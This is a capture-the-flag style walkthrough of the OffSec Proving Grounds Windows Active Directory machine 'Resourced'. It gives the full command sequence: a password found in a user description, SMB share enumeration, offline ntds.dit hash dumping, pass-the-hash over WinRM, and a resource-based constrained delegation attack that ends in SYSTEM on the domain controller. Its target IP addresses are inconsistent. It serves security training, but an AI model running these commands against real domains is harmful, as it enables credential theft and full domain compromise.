# Resourced — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Hard
**OS:** Windows (Active Directory)

---

## TL;DR

Enum4linux extracts username `V.Ventz` and password from description → `CrackMapExec` lists SMB shares → SMB enumerates "Password Audit" share → Extract `SYSTEM` and `ntds.dit` → Dump domain hashes → WinRM as `L.Livingstone` → BloodHound identifies `GenericAll` over DC → Resource-Based Constrained Delegation (RBCD) attack for Domain Admin.

---

## Enumeration

```bash
nmap -sS -p- -n -Pn -sV --min-rate=9362 192.168.178.175
```
Standard AD Domain Controller configuration.

Running `enum4linux` dumps user information, revealing a critical blunder. The description field for user `V.Ventz` states:
`New-hired, reminder: HotelCalifornia194!`

Credentials acquired: **`V.Ventz:HotelCalifornia194!`**

---

## Initial Foothold — Ntds.dit Extraction

We use `CrackMapExec` to enumerate SMB shares with our new credentials:
```bash
crackmapexec smb 192.168.178.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
```

We discover a non-standard readable share named **`Password Audit`**.
Connecting via `smbclient`:
```bash
smbclient "//192.168.178.175/Password Audit" -U resourced.local\\V.Ventz
```
Inside, we find two immensely valuable files: `SYSTEM` (the registry hive) and `ntds.dit` (the AD database).

We download these files and extract all AD hashes locally using Impacket:
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

We extract the hashes into a file and spray them across WinRM using `CrackMapExec`. The user `L.Livingstone` authenticates successfully!
```bash
evil-winrm -i 192.168.177.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

---

## Privilege Escalation — Resource-Based Constrained Delegation (RBCD)

After uploading and running BloodHound, the results show `L.Livingstone` has **GenericAll** permissions over the Domain Controller object (`RESOURCEDC.RESOURCE.LOCAL`).

This allows us to perform a **Resource-Based Constrained Delegation (RBCD)** attack. We will create a fake computer account and delegate to it the right to impersonate Administrator on the DC.

1. **Create a new computer account:**
```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.177.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```

2. **Set `msDS-AllowedToActOnBehalfOfOtherIdentity`:**
Using the `rbcd.py` script:
```bash
python3 rbcd.py -dc-ip 192.168.177.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```

3. **Request an impersonated Admin Service Ticket:**
```bash
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
export KRB5CCNAME=./Administrator.ccache
```

4. **Pass-the-Ticket to PsExec:**
```bash
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181
```

We immediately get an interactive session as **NT AUTHORITY\SYSTEM** (Domain Admin). 🎉

---

## Key Takeaways

- **Description Fields**: AD user descriptions often contain passwords set by lazy Helpdesks.
- **NTDS.dit offline dumping**: If you find backups of the AD database and SYSTEM hive, `impacket-secretsdump` can dump the entire domain locally.
- **RBCD**: If a user has `GenericAll` or `GenericWrite` over a computer object (even the DC), you can configure RBCD to impersonate the Domain Admin.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
